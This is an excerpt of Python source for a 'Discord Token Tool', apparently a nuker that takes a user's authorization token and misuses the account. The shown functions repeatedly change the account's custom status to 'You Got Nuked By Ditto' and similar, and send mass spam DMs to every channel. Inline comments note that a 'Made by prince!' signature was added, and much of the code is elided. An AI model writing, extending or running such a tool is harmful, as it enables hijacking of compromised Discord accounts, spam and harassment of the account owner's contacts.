...
def generate_random_string(Ammount):
    return "".join(random.choice(string.ascii_letters) for i in range(0, Ammount))
...
def cycle_token_status(Token):
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    statuses = [
        {"custom_status": {"text": "You Got Nuked By Ditto", "emoji_name": "🍉"}},
        {"custom_status": {"text": "dittotools.xyz", "emoji_name": "🥵"}},
        {"custom_status": {"text": "Get Good, Get Ditto", "emoji_name": "😈"}},
        {"custom_status": {"text": "Made by prince!", "emoji_name": "👑"}}  # Added your signature here too
    ]
    
    for i in range(0, 50):
        for status in statuses:
            requests.patch(
                "https://discord.com/api/v8/users/@me/settings", headers=headers, json=status
            )
            time.sleep(0.7)
...
def send_mass_dm(Token):
    ...
    for channel in mass_dm_request:
        json = {"content": f"Made by prince! {generate_random_string(20)}"}  # Added your signature
        time.sleep(1)
        r = requests.post(
...
def main():
    print(f"\n{Fore.RED}{'='*50}")
    print(f"{Fore.WHITE}DISCORD TOKEN TOOL - {Fore.RED}Made by prince!")
    ...
    try:
        choose_nuke = input(f"\n{Fore.WHITE}Please Enter An Option From The List: {Fore.RED}")
        ...
        if choose_nuke == "5" or choose_nuke == 5:
            ...
            options_list[str(choose_nuke)](Test_Token)
...
if __name__ == "__main__":
    print(f"\n{Fore.RED}Discord Token Tool {Fore.WHITE}| {Fore.RED}Made by prince!{Style.RESET_ALL}")
    while 1:
        try:
            main()
